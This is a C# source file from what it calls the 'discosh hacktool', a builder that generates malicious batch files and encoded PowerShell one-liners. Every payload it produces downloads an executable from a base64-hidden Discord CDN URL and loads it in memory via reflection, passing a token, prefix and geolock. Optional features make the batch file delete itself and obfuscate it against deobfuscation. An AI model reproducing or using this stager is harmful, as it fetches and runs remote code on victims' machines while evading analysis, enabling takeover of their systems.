using System;
using System.Text;
using discosh.Protections;

namespace discosh
{
    public class PGen
    {
        public static byte[] Generate(string token, string prefix, bool obf, bool delself, string geolock)
        {
            StringBuilder ret = new StringBuilder();
            Console.WriteLine("Generating...");
            StringBuilder gencode = new StringBuilder();
            gencode.AppendLine("rem Generated by discosh hacktool");
            gencode.AppendLine($"powershell -noprofile -command [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTU1ODUwODkzMTEzMjk4OTU3Lzk1ODI3Njg1ODUxNDg5ODk0NC9oZXlhLmV4ZQ==')))).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))");
            if (delself) gencode.AppendLine("(goto) 2>nul & del \"%~f0\"");
            gencode.AppendLine("exit");

            if (obf)
            {
                Console.WriteLine("Obfuscating...");
                string obfuscated = StringSplit.GenCode(gencode.ToString(), new Random(), 3);
                obfuscated = AntiDeobf.GenCode(obfuscated);
                ret.AppendLine("@echo off");
                ret.AppendLine("cls");
                ret.Append(obfuscated);
                return UTF16BOM.Process(ret.ToString());
            }
            else
            {
                ret.AppendLine("@echo off");
                ret.Append(gencode.ToString());
                return Encoding.ASCII.GetBytes(ret.ToString());
            }
        }

        public static string GenerateCommand(string token, string prefix, string geolock) => "powershell -noprofile -encodedcommand " + Convert.ToBase64String(Encoding.Unicode.GetBytes($"[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTU1ODUwODkzMTEzMjk4OTU3Lzk1ODI3Njg1ODUxNDg5ODk0NC9oZXlhLmV4ZQ==')))).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))"));
    }
}
